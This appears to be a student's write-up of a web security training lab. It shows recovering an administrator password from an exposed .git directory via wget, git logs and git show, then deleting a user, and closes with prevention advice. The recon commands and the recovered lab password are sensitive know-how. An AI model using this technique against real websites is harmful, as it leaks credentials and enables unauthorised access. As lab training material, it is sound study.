-----

## Lab: Information disclosure in version control history — PRACTITIONER

### 🧠 Mission Description

This lab discloses sensitive information through its version control history. The goal is to exploit this to obtain the administrator's password, log in, and then delete the user "carlos."

### 🎯 Mission Objective

Obtain the administrator password, log in to the admin panel, and delete the user "carlos."

-----

### 🪜 Steps

1.  **Initial Reconnaissance:**

      * Checked the page source code – found nothing of interest.
      * Checked `/robots.txt` – also found nothing useful.

2.  **Discovering the `.git` directory:**

      * Tried navigating to `/.git` in the browser.
      * Successfully found an **exposed `.git` directory listing**, revealing the repository structure:
        ```
        Index of /.git
        Name      Size
        <branches>
        description   73B
        <hooks>
        <info>
        <refs>
        HEAD      23B
        config    157B
        <objects>
        index     225B
        COMMIT_EDITMSG    34B
        <logs>
        ```

3.  **Cloning the Git Repository:**

      * Used `wget` to recursively download a copy of the entire `.git` repository to my local machine:
        ```bash
        wget -r https://0a8f003a04287338804f4eda00f90034.web-security-academy.net/.git
        ```
      * Navigated into the downloaded directory to confirm the files were present:
        ```bash
        ┌──(abdelrahman_mostafa㉿kali)-[~/Desktop/0a8f003a04287338804f4eda00f90034.web-security-academy.net]
        └─$ ls -als
        total 12
        4 drwxrwxr-x  3 abdelrahman_mostafa abdelrahman_mostafa 4096 Jul 26 21:26 .
        4 drwxr-xr-x 14 abdelrahman_mostafa abdelrahman_mostafa 4096 Jul 26 21:26 ..
        4 drwxrwxr-x  7 abdelrahman_mostafa abdelrahman_mostafa 4096 Jul 26 21:26 .git

        ┌──(abdelrahman_mostafa㉿kali)-[~/Desktop/0a8f003a04287338804f4eda00f90034.web-security-academy.net]
        └─$ cd .git

        ┌──(abdelrahman_mostafa㉿kali)-[~/Desktop/0a8f003a04287338804f4eda00f90034.web-security-academy.net/.git]
        └─$ ls
        COMMIT_EDITMSG  config  description  HEAD  hooks  index  index.html  info  logs  objects  refs
        ```

4.  **Inspecting the Git Logs:**

      * Examined the `logs/HEAD` file to view the commit history:
        ```bash
        ┌──(abdelrahman_mostafa㉿kali)-[~/Desktop/0a8f003a04287338804f4eda00f90034.web-security-academy.net/.git]
        └─$ cat logs/HEAD

        0000000000000000000000000000000000000000 da081537479ece823870c88aff72a6946fa6fa38 Carlos Montoya <carlos@carlos-montoya.net> 1753553909 +0000   commit (initial): Add skeleton admin panel
        da081537479ece823870c88aff72a6946fa6fa38 c4feaf7fbeadd37bfd3d79c37b33089c09fa150e Carlos Montoya <carlos@carlos-montoya.net> 1753553909 +0000   commit: Remove admin password from config
        ```
      * Noticed a commit message: "Remove admin password from config" with the commit hash `c4feaf7fbeadd37bfd3d79c37b33089c09fa150e`. This strongly suggested sensitive information might have been present *before* this commit.

5.  **Retrieving the Password from a Previous Commit:**

      * Used `git show` with the suspicious commit hash to view its contents and changes:
        ```bash
        ┌──(abdelrahman_mostafa㉿kali)-[~/Desktop/0a8f003a04287338804f4eda00f90034.web-security-academy.net/git]
        └─$ git show c4feaf7fbeadd377bfd3d79c37b33089c09fa150e

        commit c4feaf7fbeadd37bfd3d79c37b33089c09fa150e (HEAD -> master)
        Author: Carlos Montoya <carlos@carlos-montoya.net>
        Date:   Tue Jun 23 14:05:07 2020 +0000

            Remove admin password from config

        diff --git a/admin.conf b/admin.conf
        index 0754869..21d23f1 100644
        --- a/admin.conf
        +++ b/admin.conf
        @@ -1 +1 @@
        -ADMIN_PASSWORD=mne5xocl1f8pkb7uql9f
        +ADMIN_PASSWORD=env('ADMIN_PASSWORD')
        ```
      * The `diff` output clearly showed the `ADMIN_PASSWORD` before it was removed: `mne5xocl1f8pkb7uql9f`.

6.  **Logging In and Deleting the User:**

      * Used the discovered credentials to log in:
          * **Username:** `administrator`
          * **Password:** `mne5xocl1f8pkb7uql9f`
      * Navigated to the admin panel and **deleted the user "carlos."**

-----

### 🧨 Flag is

The lab was solved by logging in as the administrator and deleting the `carlos` user. The password obtained was:

```
mne5xocl1f8pkb7uql9f
```

-----

### 📝 Notes

  * **Version Control Exposure:** Publicly accessible `.git` directories can expose the entire version history of an application.
  * **Sensitive Information in History:** Developers often commit sensitive data (like passwords, API keys, or private configuration) directly into the repository, even if it's later removed. These changes remain in the history and can be recovered.
  * **Automated Tools:** Tools like `git-dumper` or `GitTools` can automate the process of downloading and extracting information from exposed `.git` repositories.
  * **Prevention:** Always ensure `.git` directories are not publicly accessible on production servers (e.g., using proper web server configurations like `deny all` or `robots.txt` disallow rules, though `robots.txt` is advisory). Use environment variables or dedicated secret management systems for sensitive configurations instead of hardcoding them or committing them to version control, even temporarily.

-----

**Status: Solved ✅**
